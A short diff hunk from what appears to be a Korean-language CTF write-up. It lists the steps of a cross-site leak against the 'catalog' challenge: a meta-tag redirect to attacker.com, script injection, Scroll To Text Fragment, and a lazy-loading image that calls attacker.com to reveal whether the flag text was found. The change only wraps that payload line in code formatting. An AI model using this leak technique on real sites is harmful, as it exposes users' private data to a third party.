@@ -89,7 +89,7 @@ fetch("http://catalog.pwni.ng/user.php", {
 2. meta tag를 이용해 attacker.com으로 이동 시킨다.
 3. attacker.com에서 로그인 요청을 발생시켜 id=3 게시물 상단에 스크립트를 삽입한다.
 4. 스크립트로 meta tag를 이용해 Scroll To Text Fragment를 발생시킨다.
-5. 이미지 지연 로딩(<img src="http://attacker.com/img" loading="lazy">)을 이용해 플래그가 검색될 경우 attacker.com의 이미지를 로드하도록 한다.
+5. 이미지 지연 로딩(```<img src="http://attacker.com/img" loading="lazy">```)을 이용해 플래그가 검색될 경우 attacker.com의 이미지를 로드하도록 한다.
 6. 이미지가 로딩되면 검색이 되었다는 뜻이고 로딩이 안되면 검색이 안되었다는 뜻이다.
 
 예시 코드
